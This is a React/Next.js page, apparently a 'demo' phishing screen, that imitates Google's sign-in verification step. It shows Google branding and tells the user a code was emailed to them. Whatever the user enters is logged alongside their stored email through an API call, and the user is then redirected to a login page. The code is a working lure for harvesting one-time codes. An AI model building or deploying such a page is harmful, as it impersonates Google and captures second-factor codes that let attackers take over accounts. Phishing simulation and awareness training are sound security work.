'use client';

import { FormEvent, useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { Roboto } from 'next/font/google';
import { apiClient } from '@/lib/api-client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';

const GoogleWordmark = ({ className = '' }: { className?: string }) => (
  <span className={`text-2xl font-medium tracking-tight ${className}`}>
    <span className="text-[#4285f4]">G</span>
    <span className="text-[#ea4335]">o</span>
    <span className="text-[#fbbc05]">o</span>
    <span className="text-[#4285f4]">g</span>
    <span className="text-[#34a853]">l</span>
    <span className="text-[#ea4335]">e</span>
  </span>
);

const googleFont = Roboto({
  subsets: ['latin'],
  weight: ['400', '500', '700'],
});

const Footer = () => (
  <footer className="mx-auto w-full max-w-3xl px-4 pb-8">
    <div className="flex flex-col gap-4 text-xs text-slate-600 md:flex-row md:items-center md:justify-between">
      <button
        type="button"
        className="inline-flex items-center gap-2 text-slate-600 hover:text-slate-900"
      >
        English (United States)
        <svg width="12" height="12" viewBox="0 0 12 12" aria-hidden="true" className="text-slate-500">
          <path d="M3 4.5l3 3 3-3" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
        </svg>
      </button>
      <div className="flex items-center gap-6">
        <button type="button" className="hover:text-slate-900">
          Help
        </button>
        <button type="button" className="hover:text-slate-900">
          Privacy
        </button>
        <button type="button" className="hover:text-slate-900">
          Terms
        </button>
      </div>
    </div>
  </footer>
);

export default function DemoGoogleCodePage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      setEmail(sessionStorage.getItem('demo_google_email') || '');
    }
  }, []);

  const handleVerify = async (e: FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);

    try {
      await apiClient.logDemoGoogleAttempt({
        step: 'code',
        email: email.trim(),
        code: code.trim(),
      });
      router.push('/login');
    } catch (err: any) {
      setError(err?.message || 'Unable to continue');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className={`${googleFont.className} min-h-screen bg-[#f1f3f4] text-slate-900`}>
      <div className="flex min-h-screen flex-col">
        <main className="flex flex-1 items-center justify-center px-4 py-10">
          <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white px-8 py-10 shadow-sm">
            <div className="text-center">
              <GoogleWordmark className="text-3xl" />
              <h1 className="mt-6 text-2xl font-semibold text-slate-900">Enter the code</h1>
              <p className="mt-3 text-sm text-slate-600">
                To help keep your account safe, Google wants to make sure it's really you trying to sign in.
              </p>
              <p className="mt-3 text-sm text-slate-600">
                An email with a verification code was just sent to{' '}
                <span className="font-medium text-slate-900">{email || '@gmail.com'}</span>
              </p>
            </div>

            <form onSubmit={handleVerify} className="mt-8 space-y-6">
              {error && (
                <div className="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700">
                  {error}
                </div>
              )}
              <div className="relative">
                <Input
                  id="demo-google-code"
                  type="text"
                  placeholder=" "
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  required
                  className="peer h-12 rounded-md border-slate-300 px-4 pt-4 text-base focus:border-[#1a73e8] focus-visible:ring-0"
                />
                <Label
                  htmlFor="demo-google-code"
                  className="pointer-events-none absolute left-4 top-3 text-sm text-slate-500 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base peer-focus:-top-2 peer-focus:text-xs peer-focus:text-[#1a73e8] peer-valid:-top-2 peer-valid:text-xs"
                >
                  Enter code
                </Label>
              </div>
              <div className="flex justify-end">
                <Button
                  type="submit"
                  className="h-10 rounded-md bg-[#1a73e8] px-8 text-sm font-semibold text-white shadow-sm hover:bg-[#155cc2]"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? 'Verifying...' : 'Next'}
                </Button>
              </div>
            </form>
          </div>
        </main>
        <Footer />
      </div>
    </div>
  );
}
